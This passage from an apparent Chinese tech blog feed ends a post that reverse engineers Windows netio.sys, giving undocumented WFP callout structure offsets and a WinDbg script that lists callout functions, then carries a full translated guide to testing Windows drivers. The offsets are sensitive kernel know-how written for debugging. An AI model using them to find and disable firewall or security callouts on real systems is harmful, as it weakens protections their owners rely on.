rsi</span><br><span class="line">.text:<span class="number">0000000000026</span>D08 <span class="number">0F</span> <span class="number">85</span> BD <span class="number">8</span>B FF FF                       jnz     loc_1F8CB</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                         loc_26D0E:                              ; CODE XREF: FeAddCalloutEntry-<span class="number">7398</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E                                                                 ; FeAddCalloutEntry-<span class="number">7380</span>↑j</span><br><span class="line">.text:<span class="number">0000000000026</span>D0E <span class="number">48</span> <span class="number">8</span>B <span class="number">5</span>C <span class="number">24</span> <span class="number">40</span>                          mov     rbx, [rsp+<span class="number">38</span>h+arg_0]</span><br><span class="line">.text:<span class="number">0000000000026</span>D13 <span class="number">48</span> <span class="number">8</span>B <span class="number">6</span>C <span class="number">24</span> <span class="number">48</span>                          mov     rbp, [rsp+<span class="number">38</span>h+arg_8]</span><br><span class="line">.text:<span class="number">0000000000026</span>D18 <span class="number">48</span> <span class="number">8</span>B <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>                          mov     rsi, [rsp+<span class="number">38</span>h+arg_10]</span><br><span class="line">.text:<span class="number">0000000000026</span>D1D <span class="number">48</span> <span class="number">8</span>B C7                                mov     rax, rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D20 <span class="number">48</span> <span class="number">83</span> C4 <span class="number">20</span>                             add     rsp, <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000026</span>D24 <span class="number">41</span> <span class="number">5</span>D                                   pop     r13</span><br><span class="line">.text:<span class="number">0000000000026</span>D26 <span class="number">41</span> <span class="number">5</span>C                                   pop     r12</span><br><span class="line">.text:<span class="number">0000000000026</span>D28 <span class="number">5F</span>                                      pop     rdi</span><br><span class="line">.text:<span class="number">0000000000026</span>D29 C3                                      retn</span><br></pre></td></tr></table></figure></p>
<p>可以分析出对于每一个注册的callout，都会将callout的callout function信息放入一个结构体中，这些结构体都放在一个数组中，猜测这个结构体的名称叫CalloutEntry，每一个CallOutEntry的大小应该是64(左移6位，相当于乘以64)。而每一个callout_id对应的CallOutEntry结构的基地址应该等于[[gWfpGlobal]+0x550] + callout_id*64，而CallOutEntry结构体内容应该如下所示。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>   unknow1</span><br><span class="line">+<span class="number">0x8</span>   unknow2</span><br><span class="line">+<span class="number">0x10</span>  classifyFn</span><br><span class="line">+<span class="number">0x18</span>  notifyFn</span><br><span class="line">+<span class="number">0x20</span>  flowDeleteFn</span><br><span class="line">+<span class="number">0x28</span>  unknow3</span><br><span class="line">+<span class="number">0x30</span>  unknow4</span><br><span class="line">+<span class="number">0x38</span>  device_object</span><br></pre></td></tr></table></figure></p>
<p>分析到这里再通过关键词gWfpGlobal搜索，可以找到参考链接3，参考链接3给出了一个windbg脚本，这里可以优化下，可以直接再Win7 x64系统下打印出系统中所有的callout function函数地址（如果提示找不到符号地址，可以执行下.reload /f /i netio.sys）。<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r <span class="variable">$t0</span>=poi(poi(netio!gWfpGlobal)+<span class="number">0x550</span>);.<span class="keyword">for</span> ( r <span class="variable">$t1</span>=<span class="number">0</span>; @<span class="variable">$t1</span> &lt; <span class="number">11</span>e; r <span class="variable">$t1</span>=@<span class="variable">$t1</span>+<span class="number">1</span> ) &#123;r <span class="variable">$t1</span>;dps @<span class="variable">$t0</span>+<span class="number">2</span>*@<span class="variable">$ptrsize</span> L3; r <span class="variable">$t0</span>=@<span class="variable">$t0</span>+<span class="number">40</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x02_参考">0x02 参考</h2><p><a href="https://qwertwwwe.github.io/windows-driver-develop-wfp-framework/" target="_blank" rel="external">1.windows驱动-WFP框架介绍及其编程</a><br><a href="https://social.msdn.microsoft.com/Forums/vstudio/en-US/66f1f00b-eab5-4d60-b8da-55010d023ebf/list-of-callout-drivers?forum=wfp" target="_blank" rel="external">2.List of callout drivers</a><br><a href="https://www.codemachine.com/article_findwfpcallouts.html" target="_blank" rel="external">3.Finding Windows Filtering Platform (WFP) Callouts</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>WFP是Windows提供的一套新的网络数据包过滤框架，用于取代之前的TDI过滤框架，为用户态和内核态都提供API支持，可以很方便的实现网络数据包拦截/编辑，常用于实现防火墙、网速控制及入侵检测等。<br>]]>
    
    </summary>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/"/>
    <id>http://www.youngroe.com/2019/05/06/Kernel/windows-driver-testing-basics/</id>
    <published>2019-05-06T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.204Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br><a id="more"></a></p>
<h2 id="0x01_Windows驱动程序的定义及类型">0x01 Windows驱动程序的定义及类型</h2><p>驱动程序是为物理或则虚拟设备提供接口的一种软件组件。驱动程序将来自用户程序和操作系统的high-level的请求翻译成物理/虚拟设备能够识别的low-level的指令。</p>
<h3 id="Windows系统的驱动文件">Windows系统的驱动文件</h3><p>Windows系统中，驱动文件以.sys扩展名文件存储，可能还会有以.inf或则.cat为后缀的辅助文件存在。<br><strong>.inf文件</strong><br>.inf文件是驱动程序安装文件，其中包含了设计驱动程序的设备的类型，驱动程序文件的位置以及所有依赖项。在驱动程序安装过程中，这些配置将从.inf文件写入到到注册表中，注册表作为驱动的配置文件。<br><strong>.cat文件</strong><br>.cat文件包含所有驱动程序文件的哈希值总和的列表。在Windows中，已安装的驱动程序通常保存在在%SystemRoot%\System32\drivers目录下，但也可以存储在任何其他位置。安装后，驱动程序已加载到系统中并可以使用。某些驱动程序类型在安装后需要重新启动。<br><!-- more --></p>
<h3 id="驱动类型">驱动类型</h3><p>根据执行模式的不同，驱动程序可以分为用户模式驱动和内核模式驱动。</p>
<h4 id="用户模式驱动(User-Mode_Drivers)">用户模式驱动(User-Mode Drivers)</h4><p>用户模式驱动程序在用户应用程序和其他操作系统组件（例如内核模式驱动程序）之间提供接口。打印机驱动程序就是是一种用户模式驱动程序。</p>
<h4 id="内核模式驱动(Kernel-Mode_Drivers)">内核模式驱动(Kernel-Mode Drivers)</h4><p>内核模式驱动程序在内核特权模式下执行。不同内核模式驱动在执行期间通常会存在链式关系。每个驱动程序在链中的位置根据其作用不同。<br>一个用户模式程序查询设备的请求通常会经过多个驱动程序。经过的每一个驱动程序都将处理和过滤这个查询，根据Windows驱动程序术语这个包被称为IRP包（I/O请求包）。如果将驱动程序加载到链中的错误位置，则查询将被错误地处理，还有可能导致系统崩溃。<br>下面的图1表示磁盘的输入输出（I/O）查询的简化模型。用户应用程序创建查询以读取磁盘上的文件。该查询通过一系列驱动程序，每个驱动程序都会处理传入和传出的数据包。</p>
<div align="center"><br><img src="/img/driver_test_driver_chain.png" alt="图1 应用程序通过驱动查询的简化模型" align="center"><br></div>

<p>在本文中，我们将重点介绍内核模式驱动程序。<br>内核模式驱动程序可以分为以下几种类型：</p>
<ul>
<li>即插即用设备驱动程序：这些驱动程序可以访问物理即插即用（PnP）设备并管理设备电源。</li>
<li>非即插即用驱动程序：这些驱动程序增强了用户应用程序功能，并提供了对通过标准API调用不可用的内核模式功能的访问。这些驱动程序不适用于物理设备。</li>
<li><p>文件系统驱动程序：这些驱动程序提供对文件系统的访问。它们将用于读取/记录文件的高级查询转换为用于磁盘驱动器的低级命令（在物理磁盘上读取/记录扇区）。<br>Windows包含两种驱动开发模型：Windows驱动程序模型（WDM）、Windows驱动程序框架（WDF）。WDF由内核模式驱动程序框架（KMDF）和用户模式驱动程序框架（UMDF）组成的。WDM和WDF都简化了使驱动程序代码在Windows版本之间兼容的难度。<br>WDM中包含以下驱动程序类型：</p>
</li>
<li><p>总线类型驱动:这些驱动程序支持特定的PCI，SCSI，USB或其他端口，以控制新设备与总线的连接。</p>
</li>
<li>功能驱动：这些驱动程序可确保特定设备的功能。它们通常支持读取/记录操作和设备电源管理。</li>
<li>过滤驱动：这些驱动程序修改对设备的查询。它们可以位于驱动程序链中功能驱动程序的上方或下方。</li>
</ul>
<h3 id="驱动程序与设备之间的关系">驱动程序与设备之间的关系</h3><p>每个内核模式驱动程序都与特定的设备一起使用，在Windows中以设备对象表示。这意味着通过驱动程序进行的I/O查询的最终目的地始终是物理或虚拟设备。这既适用于物理PnP设备的驱动程序，也适用于非PnP软件驱动程序。在测试驱动程序时，必须了解用户应用程序和设备之间存在多个驱动程序。在驱动程序执行链中每个驱动程序都可以影响对设备的最终查询结果。</p>
<h2 id="0x02_Windows驱动程序测试主要内容">0x02 Windows驱动程序测试主要内容</h2><p>不管是Linux还是Windows，有一些特定的测试是驱动程序测试所必需的，并且与驱动程序类型无关。因此，在介绍测试不同类型驱动程序的细微差别之前，我们将首先考虑它们的共性。</p>
<h3 id="不同操作系统">不同操作系统</h3><p>首先，您必须始终牢记，特定的驱动程序在不同的操作系统上的行为可能有所不同。此外，您需要考虑不同的内核版本，因为即使在同一操作系统中它们也可能有所不同。例如，Windows7和Windows7 sp1具有不同的内核。因此，您必须测试尽可能多的系统。值得一提的是，Microsoft目前还在继续支持的操作系统是从Win7/2008开始的。您还必须考虑到现在最流行的Windows版本是Windows 7和10。</p>
<h3 id="更新">更新</h3><p>有必要测试驱动程序在特殊情况下的运行情况，例如关机，重新启动和重置。您还应该牢记系统的安全特性：防火墙，数据执行保护（DEP），用户帐户控制（UAC）和杀毒软件。操作系统更新也会影响驱动程序功能。因此将操作系统更新到最新版本测试至关重要。此外，您还需要测试驱动程序更新。</p>
<h3 id="硬件依赖性">硬件依赖性</h3><p>除了软件依赖性外，还有硬件依赖性。因此，您必须测试驱动程序在启用和禁用的页面文件、多处理器及多内核的运行情况。在测试驱动程序时，必须启用driver verifier，这将为驱动程序增加另外的测试压力。在测试过程中，请检查驱动程序安装和卸载，系统重置和休眠的正确性。</p>
<h2 id="0x03_如何测试Windows驱动程序">0x03 如何测试Windows驱动程序</h2><p>测试驱动程序过程中始终会发生各种问题的，错误的操作甚至会导致严重的后果。因此，您应该在虚拟机中测试驱动程序直到稳定为止。</p>
<h3 id="文件系统过滤器驱动程序">文件系统过滤器驱动程序</h3><p>顾名思义，文件系统过滤驱动程序用于文件系统。因此，在测试此类驱动程序时，应使用NTFS，FAT32，exFAT和ReFS等文件系统进行测试。<br>为了正确测试Windows驱动程序，除了系统文件管理器Explorer之外，还应使用各种文件管理器，例如FAR或Windows Total Commander进行测试。此外，除了简单的操作（如复制，删除和重命名）外，不要忘记复杂的文件操作和文件系统变更。<br>复杂的文件系统变更包括：</p>
<ul>
<li>挂载/卸载新磁盘：<ul>
<li>ISO image</li>
<li>网络磁盘</li>
<li>虚拟硬盘</li>
<li>U盘</li>
</ul>
</li>
<li>进行磁盘扇区配置变更（更改驱动器号或名称）</li>
<li>在磁盘上执行的操作<ul>
<li>格式化分区</li>
<li>压缩分区</li>
<li>分区碎片整理</li>
<li>磁盘坏道检查</li>
<li>删除分区</li>
<li>磁盘动态化</li>
<li>在GPT / MBR中转换磁盘</li>
<li>创建新分区<br>您还必须检查：</li>
</ul>
</li>
<li>各种硬件配置（具有不同容量的SSD和HDD）</li>
<li>停止和启动服务或安装/卸载应用程序时的驱动程序行为</li>
<li>驱动程序如何与Windows工具与加密磁盘一起使用</li>
<li>驱动程序与防病毒软件的兼容性，因为防病毒软件也是文件过滤类型驱动</li>
</ul>
<h3 id="虚拟存储驱动程序">虚拟存储驱动程序</h3><p>在测试为虚拟存储创建的Windows驱动程序之前，您应该确保文件系统将是稳定的。对于虚拟存储驱动程序，应检查以下内容：</p>
<ul>
<li>驱动程序如何在以下情况下处理文件和文件夹<ul>
<li>打开操作</li>
<li>创建操作</li>
<li>编辑操作</li>
<li>保存操作</li>
<li>拷贝操作</li>
<li>剪切操作</li>
<li>重命名操作</li>
<li>删除操作</li>
</ul>
</li>
<li>驱动程在文件和文件夹执行搜索操作如何工作的。</li>
<li>驱动程序如何处理名称包含以下内容的文件<ul>
<li>字符过多</li>
<li>数字</li>
<li>空格</li>
<li>特殊字符</li>
<li>象形文字</li>
<li>非Unicode</li>
<li>西里尔字母</li>
</ul>
</li>
<li>驱动程序如何处理不同格式的文件：<ul>
<li>文本</li>
<li>图像</li>
<li>归档压缩文件</li>
<li>Office文件</li>
</ul>
</li>
<li>驱动程序如何处理具有各种属性的文件：<ul>
<li>只读属性</li>
<li>隐藏属性</li>
<li>系统属性</li>
<li>归档属性</li>
</ul>
</li>
<li>驱动程序如何处理更改文件权限以及如何使用各种NTFS功能：<ul>
<li>压缩</li>
<li>加密</li>
</ul>
</li>
<li>快捷方式（符号链接和硬链接）和隐藏副本是否正确。</li>
<li>驱动程序如何处理不同大小的文件：<ul>
<li>非常小</li>
<li>非常多非常小文件</li>
</ul>
</li>
<li>驱动程序如何处理包含大量子文件夹（超过五个）的文件夹。</li>
<li>驱动程序如何处理冲突，例如使用目标中已存在的文件名复制文件或取消复制或删除。</li>
<li>驱动程序如何处理保存从Internet或共享网络磁盘下载的文件。</li>
<li>在正常情况和极端情况下都可以进行磁盘安装/卸载。例如，尝试在复制到存储时卸载，然后在重新引导系统后检查磁盘是否已成功安装。</li>
<li>磁盘的读写速度。</li>
</ul>
<h3 id="USB设备驱动">USB设备驱动</h3><p>对于USB驱动程序测试，您应该尝试覆盖尽可能多的USB设备。您可以从最受欢迎的设备开始，例如闪存驱动器，打印机，扫描仪，鼠标，键盘，便携式硬盘驱动器，智能手机和读卡器。但是，您还应该测试不太受欢迎的设备，例如蓝牙设备，以太网设备，USB集线器，麦克风和耳机，网络摄像头和CD-ROM驱动器。<br>您应该考虑各种USB接口：USB 1.0、2.0、3.0和3.1。此外，不要忘记拔出/插入设备，禁用安全和不安全的设备以及在设备管理器中删除设备。此外，检查设备驱动程序的安装和卸载。</p>
<h2 id="0x04_驱动程序测试和分析实用工具">0x04 驱动程序测试和分析实用工具</h2><p>有许多用于测试Windows驱动程序的工具，这些工具使您可以监视系统中驱动程序的状态，验证其功能并执行测试。<br>内置的Windows工具足以获取有关驱动程序状态的基本信息（例如，是否已将其加载到系统中）。<br>内置Windows的工具：</p>
<ul>
<li>Msinfo32</li>
<li>Driverquery</li>
<li>Sc Driver Verifier<br>Sc Driver Verifier是一个系统内置工具，可让验证驱动程序功能。要深入分析测试驱动程序，您需要Windows驱动程序工具包（WDK）中提供的其他工具。</li>
</ul>
<h3 id="系统内置工具">系统内置工具</h3><h4 id="Windows系统信息工具（msinfo32）">Windows系统信息工具（msinfo32）</h4><p>Msinfo32允许您获取系统中所有已安装驱动程序的列表，每个驱动程序的类型，其当前状态（已加载/未加载）以及启动模式（系统/手动）。<br>若要实用msinfo32，请使用Win + R调出“运行”对话框，然后启动msinfo32。在系统信息控制台的左侧栏中，选择以下选项卡：软件环境&gt;系统驱动程序。</p>
<div align="center"><br><img src="/img/drivertest_msinfo32.png" alt align="center"><br></div><br>Msinfo32还可以查看和存储有关已注册驱动程序的信息。如果可以访问远程计算机的Windows Management Instrumentation（WMI），还可以查看远程计算机驱动程序列表，通过选项View &gt; Remote Computer。<br>### Driverquery命令行实用程序<br>Driverquery提供的信息类似于msinfo32中的信息。可以使用driverquery命令通过cmd启动它：<br><div align="center"><br><img src="/img/drivertest_driverquery.png" alt align="center"><br></div><br>还可以通过其他参数查询其他信息：<br>/V是用于详细输出的命令。它使您可以获得类似于msinfo32所示的驱动程序状态信息。<br>/SI提供有关已签名驱动程序的信息。<br>/S系统允许您获取有关远程系统上驱动程序的信息。<br><br>### 与服务控制管理器进行通信的sc命令<br>使用sc，命令可以查看驱动程序的状态以及启动或停止该驱动程序。要查看驱动程序列表，请运行以下命令：<br><em>sc query type= driver</em><br><div align="center"><br><img src="/img/drivertest_sc.png" alt align="center"><br></div>

<h3 id="Windows_Driver_Kit实用工具">Windows Driver Kit实用工具</h3><p>Windows驱动程序工具包（WDK）提供了一系列用于驱动程序测试的工具。WDK与MS Visual Studio集成在一起，但也可以用作一组独立的实用程序。WDK包含一组称为“设备基础测试”的测试模块，以及其他特定的实用程序，使您可以管理设备和驱动程序，监视资源使用情况，并具有用于验证的实用程序等。<br>设备基础测试集包括以下测试：</p>
<ul>
<li>并行硬件和操作系统（CHAOS）测试</li>
<li>覆盖率测试</li>
<li>CPU压力测试</li>
<li>驱动安装测试</li>
<li>I/O测试</li>
<li>渗透测试</li>
<li>即插即用测试</li>
<li>重启测试</li>
<li>休眠测试<br>为了执行测试，WDTF Simple I/O插件必须支持您的被测试设备。单击此<a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/wdtf/provided-wdtf-simpleio-plug-ins" target="_blank" rel="external">链接</a>以了解有关WDTF简单I/O插件的更多信息。<br>设备基本测试以dll库的形式组织，并且位于%ProgramFiles%\Windows Kits\10\Testing\Tests\Additional Test目录下(Windows 10)。<br>这些测试可以由TE.exe实用程序启动，该实用程序是Text Authoring和Execution Framework (TAEF)的一部分，必须与WDK一起安装。您可以在%ProgramFiles%\Windows Kits\10\Testing\Runtimes\TAEF目录中找到TE.exe。假设这是我们启动测试的示例：<br><em>TE.exe Devfund_Device_IO.dll /P:”DQ=DriverBinaryNames=testdriver.sys”</em><br>在此阶段，我们使用名为testdriver.sys的测试驱动程序作为参数启动设备I/O测试。设备基础测试和TAEF都非常适合驱动程序自动化测试。</li>
</ul>
<h3 id="Windows设备控制台（devcon-exe）">Windows设备控制台（devcon.exe）</h3><p>Windows设备控制台是一个命令行实用程序，它提供有关即插即用设备及其系统驱动程序的信息，并管理设备和特定设备类的筛选器驱动程序。使用devcon您可以安装、卸载、连接、断开和配置设备。Devcon允许您在搜索特定设备时设置模板。星号（*）可以替换查询中的一个或多个符号。<br>命令示例：</p>
<ul>
<li>devcon.exe hwids * 显示所有设备的名称和ID的列表</li>
<li>devcon.exe classes 显示所有设备类别的列表</li>
<li>devcon.exe driverfiles * 显示所有系统设备的驱动程序文件列表</li>
<li>devcon.exe classfilter USBDevice upper 显示DiskDrive设备类的筛选器驱动程序</li>
<li>devcon.exe /r classfilter DiskDrive upper !OldFilter +NewFilter 替换DiskDrive设备类的筛选器驱动程序</li>
</ul>
<h3 id="PoolMon_(poolmon-exe)">PoolMon (poolmon.exe)</h3><p>内存池监视器显示有关downloadable和nondownloadable核心内存分配的信息。该实用程序用于在测试时检测内存泄漏。</p>
<div align="center"><br><img src="/img/drivertest_poolmon.png" alt align="center"><br></div><br>驱动程序的内存分配统计信息按标记而不是按驱动程序名称排序。应该使用ExAllocatePoolWithTag和ExAllocatePoolWithQuotaTag函数在驱动程序代码中设置此标记。如果未在代码中设置标签，则系统将设置”None”标签,这样的话定位驱动内存泄漏将会很困难。<br><br>### Windows Hardware Lab Kit<br>Windows Hardware Lab Kit（HLK）是用于测试基于Windows 10的设备的测试框架。要在Windows 7，Windows 8和Windows 8.1上进行Windows设备测试，您应该使用Windows HLK的前身Windows Hardware Certification Kit（HCK）。<br>在使用Windows HLK进行测试时，应使用由两个组件组成的环境：HLK测试服务器（controller）和测试系统（client）。HLK控制器管理一组测试，将它们与测试系统连接，并定义执行计划。该控制器允许您管理一组客户端计算机上的测试。在客户端系统中，设备和驱动程序被配置用于进一步的测试，并执行测试方案。可以通过以下步骤完成准备和测试过程：<br>- 1.将HLK c;ient安装在专用计算机上。<br>- 2.将agent程序安装在一台或多台测试计算机上。<br>- 3.创建一组以逻辑方式连接一个或多个计算机的测试计算机。<br>- 4.创建一个基于控制器的项目，该项目定义要测试的元素。<br>- 5.选择一个测试目标，例如测试机器的外部设备或软件组件，例如过滤器驱动程序。<br>- 6.选择并启动测试。您可以使用播放列表执行一组特定的场景。<br>- 7.查看并分析测试结果。<br>Windows HLK允许您测试多种类型的设备。您可以通过点击链接<a href="https://docs.microsoft.com/en-us/windows-hardware/test/hlk/testref/hardware-lab-kit-test-reference" target="_blank" rel="external">链接</a>了解有关Windows HLK的更多信息。<br><br>### Driver Verifier<br><br>Driver Verifier是一个内置Windows实用程序，用于验证内核模式驱动程序。Driver Verifier使您能够检测可能损坏操作系统的驱动程序错误。使用WDK工具进行手动或自动测试时，Driver Verifier最有效。<br>Driver Verifier作为二进制Verifier.exe文件存储在%WinDir%\system32目录中。该实用程序可以以两种模式启动：通过命令行和Driver Verifier管理器。要启动命令行版本，请以管理员身份运行命令提示符，然后输入带有至少一个参数的verifier命令，例如help -verifier /？）。要打开驱动程序验证程序管理器，请运行不带参数的verifier。<br>让我们以Driver Verifier Manager为例查看驱动程序验证过程：<br>- 1.运行Driver Verifier Manager：Win + R&gt;verifier<br>- 2.选择一组标准测试或创建自定义测试。管理器还可以显示和删除当前设置以及显示有关经过验证的驱动程序的信息：<br><div align="center"><br><img src="/img/drivertest_verify.png" alt align="center"><br></div><br>- 3.选择一个或几个驱动程序进行测试。<br>- 4.重新启动计算机。将根据所选设置对驱动程序进行测试，直到将其从经过验证的驱动程序列表中删除。<br><br>#### Driver Verifier标准设置<br><br>下面，我们将介绍Windows 10 Driver Verifier程序的标准设置。在不同的Windows版本中，标准设置和补充设置的列表可能有所不同。<br>以下是Windows 10中Driver Verifier程序的标准选项：<br>- Special Pool<br>- Force IRQ Checking<br>- Pool Tracking<br>- I/O Verification<br>- Deadlock Detection<br>- DMA Verification<br>- Security Checks<br>- Miscellaneous Checks<br>- DDI Compliance Checking<br>下面我们看下每项设置的详细信息：<br><strong>Special Pool</strong><br>Driver Verifier的Special Pool选项可以分配出一块可以测试出驱动程序是否访问了被释放内存内存空间，这样就可以测试出驱动是否有内存访问问题。<br><strong>Force IRQ Checking</strong><br>在Windows中，如果启用了自旋锁选项，驱动程序将无法访问具有高IRQL的分页内存。Force IRQ Checking选项可以检测到此类问题。<br><strong>Pool Tracking</strong><br>Pool Tracking监视驱动程序的内存分配。 Driver Verifier检查为驱动程序分配的内存最终是否被释放。这有助于检测内存泄漏。<br><strong>I/O Verification</strong><br>I/O Verification选项可检测驱动程序对输入/输出的实用是否正确。在Windows 7及更高版本中，此选项还包含增强的I/O检查功能，该功能对以下请求执行压力测试：PnP IRP、电源IRP及WMI IRP。通过死锁检测，Driver Verifier可以监视驱动程序使用的同步对象，例如互斥锁和自旋锁，这就是可以检测到潜在的死锁。<br><strong>DMA Verification</strong><br>使用DMA Verification，Driver verification可以监视对Direct Memory的使用。DMA允许设备不经过CPU直接使用内存。<br><strong>Security Checks</strong><br>Driver Verifier的Security Checks选项可以检测出一些安全问题，如内核函数访问用户态内存地址或则不正确的参数使用。<br><strong>Miscellaneous Checks</strong><br>启用Miscellaneous Checks后，将对驱动程序进行测试，以检查可能导致驱动程序或系统崩溃的潜在错误，例如驱动释放了其他驱动正在使用的内存空间。<br><strong>DDI Compliance Checking</strong><br>在与操作系统的内核接口进行的通信（设备驱动程序接口）中检查驱动程序是否存在潜在错误。<br><br>为了有效地检测Driver Verifier中的错误，您应该遵循以下建议：<br>- 1.除非刻意这样，否则不要同时验证多个驱动程序。<br>- 2.下启用内存转储生成应对可能的系统崩溃情况（BSOD）。<br>- 3.如果需要启用调试模式并使用调试器通过网络或COM/USB端口连接到被测试系统。<br><br>### 驱动数字签名<br>在Windows XP，Windows Vista和Windows 7中，对安装驱动程序软件包的软件包签名没有严格要求。因此，您可以轻松安装没有签名的驱动程序。但是如果安装包未进行签名，会看到以下警告：<br><div align="center"><br><img src="/img/drivertest_warnning.png" alt align="center"><br></div>

<p>为了使驱动程序被识别为来自受信任的发布者，必须在Windows XP中使用Windows硬件质量实验室（WHQL）签名对驱动程序包进行签名。在Windows Vista和Windows 7中，必须使用受信任的根CA证书对驱动程序包进行签名。在Windows 8，Windows 8.1和Windows 10中，需要对驱动程序签名，因为没有它就无法安装驱动程序。过去需要使用SHA-1算法对证书进行加密。现在，SHA-1已过时，通常应该使用SHA-2算法应用于证书。<br>您可以通过以下<a href="https://technet.microsoft.com/en-us/library/security/2880823" target="_blank" rel="external">链接</a>了解有关SHA-2算法的更多信息。</p>
<h3 id="驱动sys文件签名">驱动sys文件签名</h3><p>在内核模式下运行驱动程序之前，Windows将检查驱动程序二进制.sys文件的数字签名。值得注意的是，Windows XP和Windows Vista 32位不需要数字驱动程序签名。Windows Vista 64位，Windows 7，Windows 8和Windows 8.1要求签名带有在其根目录中包含Microsoft Code Verification Root的证书，或者由内核信任的另一个证书。Windows 10版本1607及更高版本要求使用Windows Hardware Developer Center网站对驱动程序进行签名。<br>为了Windows驱动程序测试，您可以暂时禁用数字驱动程序签名检查。在Windows 10中，可以通过以下方式执行此操作：</p>
<ul>
<li>1.按住Shift键，然后在Windows主菜单中选择“重新启动”选项。</li>
<li>2.选择Troubleshoot -&gt; Advanced Options -&gt; Startup Settings -&gt; Restart</li>
<li>3.在启动设置中，按F7键选择禁用驱动程序签名强制实施选项。<br><div align="center"><br><img src="/img/drivertest_disable.png" alt align="center"><br></div><br>要在启用了安全启动选项的Windows中测试驱动程序，必须确保驱动程序具有有效的签名。</li>
</ul>
<h2 id="0x05_问题定位">0x05 问题定位</h2><p>驱动程序中运行错误可能导致系统崩溃。因此，除了定义特定步骤外，本地化错误还意味着了解驱动程序是否造成了BSOD。为了确定这一点，您必须查看系统内存转储。这是在BSOD之后自动收集的，您可以在C:\Windows\Memory.dmp目录中找到它。要查看完整的内核转储，您应该告诉系统收集它。内核转储还包含有关磁盘上可用内存的必要信息。要获取此信息，您应该打开Advanced system settings &gt; Startup，然后单击Settings。</p>
<div align="center"><br><img src="/img/drivertest_enabledmp.png" alt align="center"><br></div><br>检查是否启用了“完整内存转储”或“内核内存转储”选项。<br><div align="center"><br><img src="/img/drivertest_fulldmp.png" alt align="center"><br></div>

<p>在这些设置中，您可以更改内存转储的存储位置。<br>一旦有了完整的dmp，就应该对其进行分析。这是WinDbg有用的地方。使用此工具之前，您必须下载特定的Microsoft符号。您可以阅读<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee416588(v=vs.85" target="_blank" rel="external">本指南</a>.aspx)以了解操作方法。<br>打开dmp文件并输入!analyze -v命令。注意堆栈，您将看到产生BSOD的原因。在某些情况下，您将无法从系统中获取转储文件，因为系统一直在崩溃。在这种情况下，您应该使用Windows高级启动选项。然后，您可以在几种特殊模式下运行系统。最简单，最可靠的一种是安全模式模式。在安全模式下，系统的一些操作将受到限制，您需要的只是获取C:\Windows文件夹中的dmp文件，这种操作安全模式使支持的。<br>您也可以尝试在系统故障时禁用自动重启功能，这可能有助于防止持续重启。如果系统崩溃，则应检查driver verifier是否启用。当开发人员尝试重现该错误时，此信息可能对他们非常有帮助。除了系统崩溃之外，您还可能面临其他问题，例如与功能或性能相关的问题。<br>要定位功能问题，您应该采取以下措施：<br>尝试在另一个环境中（在没有防病毒软件的其他操作系统中，在另一个文件系统上，使用实体计算机等）中重现问题。您也可以尝试其他条件，例如不同类型的文件和不同的文件大小。如果问题与您的USB设备有关，请检查其他类型的设备。如果网络是导致网络设备驱动程序错误的潜在原因，请检查各种网络设置（启动时间，带宽，启用或禁用防火墙）。当问题仅针对具有特定权限的用户出现时，请使用其他权限（管理员或标准）去定位问题。<br>如果问题与性能有关，则您的操作将取决于您要改善其性能的元素：</p>
<ul>
<li>如果问题出在网络设备驱动程序中，请模拟网络延迟或尝试在高速网络中重现这个问题。</li>
<li>如果问题与文件操作有关，请使用不同数量的不同大小的文件进行验证。</li>
<li>如果问题与USB摄像头有关，请使用其他应用层软件再进行测试验证。</li>
</ul>
<h2 id="0x06_驱动测试报告模板">0x06 驱动测试报告模板</h2><div align="center"><br><img src="/img/drivertest_testsample.png" alt align="center"><br></div>

<h2 id="0x07_结论">0x07 结论</h2><p>在本文中，我们描述了驱动程序的主要类型以及测试它们的方法和实用工具。Windows内核驱动程序测试与测试桌面应用程序有很大不同。如果驱动程序包含错误，通常会影响整个系统的稳定性，并最终导致BSOD。检测、定位和消除驱动程序错误，可以大大降低了最终用户系统行为不稳定的风险。</p>
<p><em>原文链接：<a href="https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics" target="_blank" rel="external">https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br>]]>
    
    </summary>
    
      <category term="测试" scheme="http://www.youngroe.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何正确的对Windows软件进行逆向工程（翻译/转载）]]></title>
